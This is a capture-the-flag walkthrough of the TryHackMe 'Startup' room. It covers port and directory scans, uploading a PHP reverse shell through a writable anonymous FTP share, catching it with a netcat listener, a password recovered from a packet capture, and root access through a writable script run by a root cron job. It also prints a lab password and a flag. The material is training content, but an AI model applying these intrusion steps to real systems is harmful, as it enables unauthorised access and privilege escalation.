# TryHackMe-Startup

## NMAP

```
Nmap scan report for 10.10.126.211
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.14.3.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


## PORT 80

<img src="https://imgur.com/BeyLjt9.png"/>



## Gobuster

```
root@kali:~/TryHackMe/Easy/Startup# gobuster dir -u http://10.10.126.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 16
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.126.211/
[+] Threads:        16
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/09 21:02:55 Starting gobuster
===============================================================
/files (Status: 301)

```
Visting `/files` 

<img src="https://imgur.com/9QKO9K2.png"/>

We found `notice.txt`

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Here `maya` might be a username

There wasn't anything in the `ftp` directory

## PORT 21 (FTP)

<img src="https://imgur.com/qRHvzXL.png"/>

Here we find a hidden log file `.test.log`

But we see something interesting when looking at `ftp` directory

```
drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp
```

We can read and write files on that directory

So I tried to upload php reverse shell and it did get uploaded

```
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (36.6331 MB/s)
ftp> 
```

Now let's go back to `/files/ftp`

<img src="https://imgur.com/rXdAZqu.png"/>

And then listen for the port you setup in that reverse shell and we'll get it
```
Croot@kali:~/TryHackMe/Easy/Startup# nc -lvp 6666
listening on [any] 6666 ...
10.10.126.211: inverse host lookup failed: Unknown host
connect to [10.14.3.143] from (UNKNOWN) [10.10.126.211] 58662
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:32:06 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```
rwxr-xr-x  26 root     root      4096 Nov  9 15:54 .
drwxr-xr-x  26 root     root      4096 Nov  9 15:54 ..
drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
drwxr-xr-x   2 root     root      4096 Nov  9 02:10 data
drwxr-xr-x  16 root     root      3560 Nov  9 15:53 dev
drwxr-xr-x  96 root     root      4096 Nov  9 02:33 etc
drwxr-xr-x   3 root     root      4096 Nov  9 02:15 home
drwxr-xr-x   2 www-data www-data  4096 Nov  9 02:12 incidents
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
drwx------   2 root     root     16384 Sep 25 08:12 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
dr-xr-xr-x 126 root     root         0 Nov  9 15:53 proc
-rw-r--r--   1 www-data www-data   136 Nov  9 02:12 recipe.txt
drwx------   4 root     root      4096 Nov  9 02:15 root
drwxr-xr-x  25 root     root       900 Nov  9 16:26 run
drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
drwxr-xr-x   2 root     root      4096 Nov  9 02:10 snap
drwxr-xr-x   3 root     root      4096 Nov  9 02:11 srv
dr-xr-xr-x  13 root     root         0 Nov  9 16:33 sys
drwxrwxrwt   7 root     root      4096 Nov  9 16:35 tmp
drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
drwxr-xr-x   2 root     root      4096 Nov  9 02:10 vagrant
drwxr-xr-x  14 root     root      4096 Nov  9 02:11 var
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic

```

Here we can find `recipe.txt` that tells the answer to `What is the secret spice soup recipe ?`

I ran `find` command to check what file can`www-data` is able to read  

Running linpeas I found

<img src="https://imgur.com/sIRgo5c.png"/>

```
/vagrant                                                                                                                                            
/incidents                                                                                                                                          
/data 
```

Are unexpected folders in system(/) directory

Going to `/incidents`

```
www-data@startup:/incidents$ ls -al
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov  9 02:12 .
drwxr-xr-x 26 root     root      4096 Nov 10 14:10 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov  9 02:12 suspicious.pcapng
www-data@startup:/incidents$ 

```
<img src="https://imgur.com/Yw05Mqg.png"/>

I then followed `tcp stream`

<img src="https://imgur.com/gXm09BG.png"/>

Now this `c4ntg3t3n0ughsp1c3` password maybe for `lennie` or `vagrant`

```
www-data@startup:/incidents$ su lennie
Password: 
lennie@startup:/incidents$ 
```
So we finally get to lower privileged user  


### User Flag

```
lennie@startup:/incidents$ cd ~
lennie@startup:~$ ls -al
total 20
drwx------ 4 lennie lennie 4096 Nov  9 02:12 .
drwxr-xr-x 3 root   root   4096 Nov  9 02:15 ..
drwxr-xr-x 2 lennie lennie 4096 Nov  9 02:12 Documents
drwxr-xr-x 2 root   root   4096 Nov  9 02:13 scripts
-rw-r--r-- 1 lennie lennie   38 Nov  9 02:12 user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
lennie@startup:~$ 
```
## Privilege Escalation

```
lennie@startup:~/scripts$ ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov  9 02:13 .
drwx------ 4 lennie lennie 4096 Nov  9 02:12 ..
-rwxr-xr-x 1 root   root     77 Nov  9 02:12 planner.sh
-rw-r--r-- 1 root   root      1 Nov 10 14:45 startup_list.txt
lennie@startup:~/scripts$ 
```
We now can see in lennie's home directory there is `/srcipts` where we can do something with `planner.sh`. It seems we cannot edit that file so there is another script file that we can edit

```
lennie@startup:~/scripts$ ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov  9 02:13 .
drwx------ 4 lennie lennie 4096 Nov  9 02:12 ..
-rwxr-xr-x 1 root   root     77 Nov  9 02:12 planner.sh
-rw-r--r-- 1 root   root      1 Nov 10 14:58 startup_list.txt
lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ ls -al /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov  9 02:12 /etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ 
```

After adding a reverse bash shell don't just run the script because it would just give you a shell as `lennie` see starts listening and don't just run the script it would give a shell with in a minute.

<img src="https://imgur.com/IeUPwTh.png"/>

```
root@startup:~# crontab -l
crontab -l
* * * * * /home/lennie/scripts/planner.sh
root@startup:~# 
```
As you can see it was a cronjob

